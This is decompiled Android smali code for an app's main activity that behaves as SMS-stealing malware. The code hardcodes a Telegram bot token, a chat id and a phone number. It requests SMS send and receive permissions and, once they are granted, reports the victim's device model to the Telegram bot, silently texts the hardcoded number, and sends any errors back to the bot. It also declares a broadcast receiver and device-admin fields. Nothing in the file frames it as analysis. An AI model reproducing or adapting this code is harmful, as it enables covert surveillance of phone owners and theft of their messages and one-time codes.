.class public Lcom/example/appjava/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# instance fields
.field private appBarConfiguration:Landroidx/navigation/ui/AppBarConfiguration;

.field private binding:Lcom/example/appjava/databinding/ActivityMainBinding;

.field public final client:Lokhttp3/OkHttpClient;

.field device:Ljava/lang/String;

.field private devicePolicyManager:Ljava/lang/Object;

.field id:Ljava/lang/String;

.field id2:Ljava/lang/String;

.field mDeviceAdminSample:Landroid/content/ComponentName;

.field no_hp:Ljava/lang/String;

.field private onNotice:Landroid/content/BroadcastReceiver;

.field token:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    const-string v0, "7488462937:AAGBVYJ1fjc10Vgzt8ZqCzmC3PsmRwnNwio"

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    const-string v0, "6725854937"

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->id:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->id2:Ljava/lang/String;

    const-string v0, "081311115214"

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->no_hp:Ljava/lang/String;

    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " - "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->device:Ljava/lang/String;

    new-instance v0, Lcom/example/appjava/MainActivity$1;

    invoke-direct {v0, p0}, Lcom/example/appjava/MainActivity$1;-><init>(Lcom/example/appjava/MainActivity;)V

    iput-object v0, p0, Lcom/example/appjava/MainActivity;->onNotice:Landroid/content/BroadcastReceiver;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const-string v0, "android.permission.RECEIVE_SMS"

    invoke-virtual {p0, v0}, Lcom/example/appjava/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "android.permission.SEND_SMS"

    invoke-virtual {p0, v1}, Lcom/example/appjava/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    const/4 v0, 0x1

    aput-object v1, v2, v0

    const/16 v0, 0x3e8

    invoke-virtual {p0, v2, v0}, Lcom/example/appjava/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    :cond_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 16

    move-object/from16 v1, p0

    const-string v0, "_"

    invoke-super/range {p0 .. p3}, Landroidx/appcompat/app/AppCompatActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 v2, 0x3e8

    move/from16 v3, p1

    if-eq v3, v2, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x0

    aget v4, p3, v2

    if-nez v4, :cond_1

    const-string v4, "Permission Granted!"

    invoke-static {v1, v4, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v4

    invoke-virtual {v4}, Landroid/widget/Toast;->show()V

    iget-object v4, v1, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "https://api.telegram.org/bot"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v8, v1, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "/sendMessage?parse_mode=markdown&chat_id="

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v9, v1, Lcom/example/appjava/MainActivity;->id:Ljava/lang/String;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v9, "&text=*Terinstall Perangkat :* _"

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->device:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v5

    invoke-virtual {v4, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v4

    new-instance v5, Lcom/example/appjava/MainActivity$2;

    invoke-direct {v5, v1}, Lcom/example/appjava/MainActivity$2;-><init>(Lcom/example/appjava/MainActivity;)V

    invoke-interface {v4, v5}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v10

    iget-object v11, v1, Lcom/example/appjava/MainActivity;->no_hp:Ljava/lang/String;

    const/4 v12, 0x0

    move-object v4, v12

    check-cast v4, Ljava/lang/String;

    iget-object v13, v1, Lcom/example/appjava/MainActivity;->device:Ljava/lang/String;

    const/4 v14, 0x0

    move-object v4, v14

    check-cast v4, Landroid/app/PendingIntent;

    const/4 v15, 0x0

    move-object v4, v15

    check-cast v4, Landroid/app/PendingIntent;

    invoke-virtual/range {v10 .. v15}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    iget-object v4, v1, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->id:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->device:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v5

    invoke-virtual {v4, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v4

    new-instance v5, Lcom/example/appjava/MainActivity$3;

    invoke-direct {v5, v1}, Lcom/example/appjava/MainActivity$3;-><init>(Lcom/example/appjava/MainActivity;)V

    invoke-interface {v4, v5}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    invoke-virtual/range {p0 .. p0}, Lcom/example/appjava/MainActivity;->finish()V

    iget-object v4, v1, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v10, v1, Lcom/example/appjava/MainActivity;->id2:Ljava/lang/String;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v9, v1, Lcom/example/appjava/MainActivity;->device:Ljava/lang/String;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v0

    invoke-virtual {v0}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v0

    invoke-virtual {v4, v0}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v0

    new-instance v4, Lcom/example/appjava/MainActivity$4;

    invoke-direct {v4, v1}, Lcom/example/appjava/MainActivity$4;-><init>(Lcom/example/appjava/MainActivity;)V

    invoke-interface {v0, v4}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    invoke-virtual/range {p0 .. p0}, Lcom/example/appjava/MainActivity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v4, v1, Lcom/example/appjava/MainActivity;->client:Lokhttp3/OkHttpClient;

    new-instance v5, Lokhttp3/Request$Builder;

    invoke-direct {v5}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, v1, Lcom/example/appjava/MainActivity;->token:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, v1, Lcom/example/appjava/MainActivity;->id:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&text=** _"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v5

    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v5

    invoke-virtual {v4, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v4

    new-instance v5, Lcom/example/appjava/MainActivity$5;

    invoke-direct {v5, v1}, Lcom/example/appjava/MainActivity$5;-><init>(Lcom/example/appjava/MainActivity;)V

    invoke-interface {v4, v5}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    invoke-virtual/range {p0 .. p0}, Lcom/example/appjava/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    :cond_1
    :goto_0
    return-void
.end method
